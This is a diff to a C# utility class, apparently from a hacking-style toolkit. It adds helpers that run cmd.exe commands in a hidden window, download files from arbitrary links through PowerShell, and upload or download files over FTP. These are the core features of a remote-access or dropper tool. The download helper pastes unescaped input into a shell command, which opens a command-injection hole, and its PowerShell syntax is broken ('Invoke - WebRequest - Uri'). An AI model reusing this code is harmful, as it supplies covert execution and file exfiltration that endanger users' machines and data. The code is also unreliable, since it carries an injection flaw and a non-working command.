@@ -456,22 +456,51 @@ namespace k3rn3lpanicTools
             System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo(@"cmd.exe");
 
             psi.RedirectStandardOutput = true;
-            psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-            
             psi.UseShellExecute = false;
             psi.Arguments = "/c " + command;
+            psi.CreateNoWindow = true;
+            psi.WindowStyle = ProcessWindowStyle.Hidden;
             System.Diagnostics.Process proc = System.Diagnostics.Process.Start(psi); ////
-            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             System.IO.StreamReader myOutput = proc.StandardOutput;
-            proc.WaitForExit(3000);
-            if (proc.HasExited)
-            {
+            proc.WaitForExit(1000);
                 string output = myOutput.ReadToEnd();
                 return output;
-            }
+            
             
             return "";
 
+        }
+        public static bool DownlodFromLink(string link,string filenametosave)
+        {
+            try {
+                Runcommand("powershell -c \"Invoke - WebRequest - Uri '"+link+"' - OutFile '"+filenametosave+"'\"");
+                return true;
+            }
+            catch {
+                return false;
+            }
+        }
+        public static bool DownloadFromFTP(string ftpaddress , string username , string password,string fileNameToSave , string remoteFileName) {
+            try
+            {
+                new FTPClient(ftpaddress, username, password, false).DoWork(fileNameToSave, remoteFileName);
+                return true;
+            }
+            catch {
+                return false;
+            }
+        }
+        public static bool UploadFiletoFTP(string ftpaddress, string username, string password, string localfilename, string remoteFileName)
+        {
+            try
+            {
+                new FTPClient(ftpaddress, username, password, true).DoWork(localfilename, remoteFileName);
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
         }
         public static string GetRandomFolder()
         {
@@ -492,5 +521,6 @@ namespace k3rn3lpanicTools
                 return "";
             }
         }
+       
     }
 }
